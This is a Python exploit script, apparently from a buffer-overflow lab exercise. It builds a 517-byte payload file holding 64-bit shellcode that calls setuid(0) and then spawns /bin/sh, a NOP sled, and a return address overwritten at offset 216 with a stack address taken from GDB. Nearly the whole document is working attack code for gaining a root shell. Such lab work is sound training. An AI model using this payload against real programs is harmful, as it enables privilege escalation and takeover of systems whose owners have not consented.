#!/usr/bin/python3
import sys

shellcode = (
    "\x48\x31\xff"
    "\x48\x31\xc0"
    "\xb0\x69"
    "\x0f\x05"
    "\x48\x31\xd2"
    "\x52"
    "\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
    "\x50"
    "\x48\x89\xe7"
    "\x52"
    "\x57"
    "\x48\x89\xe6"
    "\x48\x31\xc0"
    "\xb0\x3b"
    "\x0f\x05"
).encode('latin-1')

content = bytearray(0x90 for i in range(517))

##################################################################
# IMPORTANT: Place shellcode AFTER the return address in the payload
# but the return address points to a location BEFORE shellcode in memory

# Put shellcode at offset 300 (well after the return address at 216)
start = 300
content[start:start + len(shellcode)] = shellcode

# Return address calculation:
# We want to land in the NOP sled that leads to shellcode
# Buffer in GDB: 0x7fffffffd880
# Shellcode will be at: buffer + 300 bytes
# Point return address slightly before that, into NOPs

# Account for GDB offset (typically need to add more for 64-bit)
ret = 0x7fffffffd880 + 0x200  # Try 0x7fffffffda80

# Offset to return address location
offset = 216

# 8 bytes for 64-bit
L = 8
content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')

##################################################################

with open('badfile', 'wb') as f:
    f.write(content)

print("="*60)
print("Level 3 (64-bit) Exploit Created!")
print(f"Shellcode at offset:     {start}")
print(f"Shellcode length:        {len(shellcode)} bytes")
print(f"Return address at:       offset {offset}")
print(f"Return address points:   0x{ret:016x}")
print(f"Target (shellcode at):   0x{0x7fffffffd880 + start:016x}")
print("="*60)